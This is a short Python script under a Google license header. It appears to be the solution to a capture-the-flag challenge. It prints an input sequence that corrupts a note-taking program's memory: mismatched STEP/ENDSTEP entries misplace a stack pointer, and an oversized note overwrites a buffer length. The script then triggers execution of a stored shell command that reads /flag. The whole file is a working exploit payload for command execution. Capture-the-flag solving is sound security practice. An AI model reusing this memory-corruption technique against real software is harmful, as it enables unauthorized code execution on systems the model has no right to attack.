# Copyright 2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


cmd = "echo 'FLAG: '; cat /flag; echo"
buf = ""

for i in range(600):
  buf += ("2") + "\n"
  buf += "\n"

buf += ("2") + "\n"
buf += ("note: " + cmd) + "\n"
buf += "\n"

for i in range(596, 601):
  buf += ("3") + "\n" # delete
  buf += str(i) + "\n" # five entries before command

buf += ("2") + "\n"
buf += ("STEP") + "\n"
buf += ("STEP") + "\n"
buf += "\n" # mismatched (consumes three entries)
buf += ("2") + "\n"

buf += ("ENDSTEP") + "\n" # stack pointer is now in the wrong place
buf += ("ENDSTEP") + "\n"
buf += ("STEP") + "\n" # allocate (second) entry, last before command. Overwrites buffer len = 600
buf += ("note: " + "*" * 512 + "G") + "\n" # ('G' & 7) == 7
buf += "\n"

buf += ("4") + "\n" # execute
buf += ("601")
buf += "\n"
buf += "\n"
buf += "\n"
buf += "5\n"

print(buf)
